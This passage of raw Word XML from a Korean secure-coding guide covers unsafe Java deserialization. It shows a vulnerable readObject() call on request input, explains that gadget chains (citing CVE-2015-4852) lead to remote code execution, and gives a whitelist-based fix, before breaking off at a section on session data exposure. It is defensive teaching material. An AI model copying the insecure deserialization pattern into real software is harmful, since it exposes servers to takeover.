              <w:t>ObjectInputStream ois = new ObjectInputStream(request.getInputStream());</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">Object obj = ois.readObject();  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>악성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직렬화</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>객체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전송</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> Java </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역직렬화</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약점</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(CVE-2015-4852 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이용해</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>악성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직렬화</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>객체를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전송하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> readObject() </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>호출</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가젯</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>체인이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> OS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수행됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>. RCE(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>원격</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이어져</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>완전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>장악이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역직렬화</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>클래스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>화이트리스트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제한</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// (Apache Commons IO</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> ValidatingObjectInputStream </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>활용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>ValidatingObjectInputStream vois =</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    new ValidatingObjectInputStream(request.getInputStream());</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">vois.accept(UserDto.class, OrderDto.class);  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>클래스만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>지정</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Object obj = vois.readObject();</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>제</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>절</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>캡슐화</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>잘못된</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>세션에</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>데이터</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정보노출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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
